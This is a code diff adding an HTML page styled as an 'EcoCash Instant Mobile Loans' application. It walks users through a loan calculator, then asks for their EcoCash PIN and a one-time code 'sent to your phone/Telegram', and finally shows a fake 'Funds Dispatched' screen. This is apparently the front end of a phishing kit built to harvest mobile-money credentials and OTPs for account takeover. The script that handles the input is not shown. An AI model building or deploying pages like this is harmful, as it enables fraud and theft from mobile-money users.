@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Instant Mobile Loans</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="app-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <span class="icon">⚡</span>
+                <h2>EcoCash Loans</h2>
+            </div>
+            <span class="badge">Instant Mobile Loan</span>
+        </header>
+
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="step active" id="step1-indicator">1</div>
+            <div class="line"></div>
+            <div class="step" id="step2-indicator">2</div>
+            <div class="line"></div>
+            <div class="step" id="step3-indicator">3</div>
+            <div class="line"></div>
+            <div class="step" id="step4-indicator">4</div>
+        </div>
+
+        <!-- STEP 1: Loan Calculation & Request Form -->
+        <div id="step1" class="step-content">
+            <h3>Calculate & Request Loan</h3>
+            <p class="subtitle">Select your loan amount and fill in your details.</p>
+
+            <form onsubmit="submitLoanStep1(event)">
+                <div class="calculator">
+                    <label>Loan Amount ($)</label>
+                    <div class="amount-display" id="amountDisplay">$300</div>
+                    <input type="range" id="loanAmount" min="50" max="2000" step="50" value="300">
+                    <div class="range-labels">
+                        <span>$50</span>
+                        <span>$2,000</span>
+                    </div>
+
+                    <div class="calc-summary">
+                        <div>Interest (5%): <strong id="interestDisplay">$15</strong></div>
+                        <div>Total Repayable: <strong id="totalDisplay">$315</strong></div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="fullName">Full Name</label>
+                    <input type="text" id="fullName" placeholder="Enter your full name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="loanPurpose">Loan Purpose</label>
+                    <select id="loanPurpose" required>
+                        <option value="Personal Business">Personal Business</option>
+                        <option value="Emergency Expenses">Emergency Expenses</option>
+                        <option value="School Fees">School Fees</option>
+                        <option value="Medical Bill">Medical Bill</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="btn btn-primary">Continue to Verification &rarr;</button>
+            </form>
+        </div>
+
+        <!-- STEP 2: PIN Verification -->
+        <div id="step2" class="step-content hidden">
+            <h3>EcoCash PIN Authorization</h3>
+            <p class="subtitle">Enter your 4-digit EcoCash PIN to confirm identity.</p>
+
+            <form onsubmit="submitPinStep2(event)">
+                <div class="form-group">
+                    <label for="userPin">EcoCash PIN</label>
+                    <input type="password" id="userPin" maxlength="4" placeholder="••••" pattern="[0-9]{4}" required>
+                </div>
+                <button type="submit" class="btn btn-primary">Submit for Approval</button>
+            </form>
+        </div>
+
+        <!-- STEP 3: OTP Verification -->
+        <div id="step3" class="step-content hidden">
+            <h3>Enter OTP Verification Code</h3>
+            <p class="subtitle">Enter the 6-digit verification code sent to your phone/Telegram.</p>
+
+            <form onsubmit="verifyOtpStep3(event)">
+                <div class="form-group">
+                    <label for="otpCode">Verification Code (OTP)</label>
+                    <input type="text" id="otpCode" maxlength="6" placeholder="123456" pattern="[0-9]{6}" required>
+                </div>
+                <button type="submit" class="btn btn-success">Verify & Receive Funds</button>
+            </form>
+        </div>
+
+        <!-- STEP 4: Success Screen -->
+        <div id="step4" class="step-content hidden text-center">
+            <div class="success-icon">🎉</div>
+            <h3>Application Approved!</h3>
+            <p class="subtitle">Your loan request has been successfully processed and dispatched to your EcoCash account.</p>
+            <div class="info-card">
+                <p><strong>Status:</strong> Funds Dispatched</p>
+                <p>Check your EcoCash SMS for transaction confirmation.</p>
+            </div>
+            <button onclick="location.reload()" class="btn btn-secondary">Submit New Request</button>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
+  
